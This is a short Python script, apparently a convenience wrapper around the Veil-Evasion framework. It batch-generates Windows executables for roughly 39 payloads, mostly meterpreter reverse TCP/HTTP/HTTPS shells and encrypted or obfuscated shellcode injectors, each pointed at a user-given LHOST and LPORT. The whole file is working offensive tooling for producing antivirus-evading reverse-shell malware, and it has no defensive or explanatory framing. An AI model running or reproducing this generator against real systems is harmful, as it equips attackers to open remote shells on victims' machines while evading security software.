import os
import argparse

veil_path = "/root/Veil-Evasion/Veil-Evasion.py"
payload_list=["auxiliary/coldwar_wrapper",
              "auxiliary/pyinstaller_wrapper",
              "c/meterpreter/rev_http",
              "c/meterpreter/rev_http_service",
              "c/meterpreter/rev_tcp",
              "c/meterpreter/rev_tcp_service",
              "c/shellcode_inject/flatc",
              "cs/meterpreter/rev_http",
              "cs/meterpreter/rev_https",
              "cs/meterpreter/rev_tcp",
              "cs/shellcode_inject/base64_substitution",
              "cs/shellcode_inject/virtual","native/Hyperion",
              "native/backdoor_factory","native/pe_scrambler",
              "powershell/meterpreter/rev_http",
              "powershell/meterpreter/rev_https",
              "powershell/meterpreter/rev_tcp",
              "powershell/shellcode_inject/download_virtual",
              "powershell/shellcode_inject/psexec_virtual",
              "powershell/shellcode_inject/virtual",
              "python/meterpreter/rev_http",
              "python/meterpreter/rev_http_contained",
              "python/meterpreter/rev_https",
              "python/meterpreter/rev_https_contained",
              "python/meterpreter/rev_tcp",
              "python/shellcode_inject/aes_encrypt",
              "python/shellcode_inject/arc_encrypt",
              "python/shellcode_inject/base64_substitution",
              "python/shellcode_inject/des_encrypt",
              "python/shellcode_inject/flat",
              "python/shellcode_inject/letter_substitution",
              "python/shellcode_inject/pidinject",
              "ruby/meterpreter/rev_http",
              "ruby/meterpreter/rev_http_contained",
              "ruby/meterpreter/rev_https",
              "ruby/meterpreter/rev_https_contained",
              "ruby/meterpreter/rev_tcp",
              "ruby/shellcode_inject/flat"]

parser = argparse.ArgumentParser(description='Auto Veiled Payload Generator')
parser.add_argument('-LHOST',metavar='[x.x.x.x]',type=str,help='Local IP Address',required=True)
parser.add_argument('-LPORT',metavar='PORT NO', type=str,help="Port No",required=True)
parser.add_argument('-o',type=str,metavar='/path/to/outputfile',help='output folder')


args = parser.parse_args()

#check output folder
if args.o is None:
    path=os.path.expanduser("~/payloads/")
else:
    path=args.o
#create folder
if not os.path.exists(path):
    os.makedirs(path)


# create command for each payload
def createCommandStr(payload):
    of=payload.split("/")
    return "python "+veil_path+" -p "+payload+" -c LHOST="+args.LHOST+" LPORT="+args.LPORT+" compile_to_exe=Y -o "+path+of[len(of)-2]+"_"+of[len(of)-1]+".exe --overwrite"



for payload in payload_list:
    os.system(createCommandStr(payload))
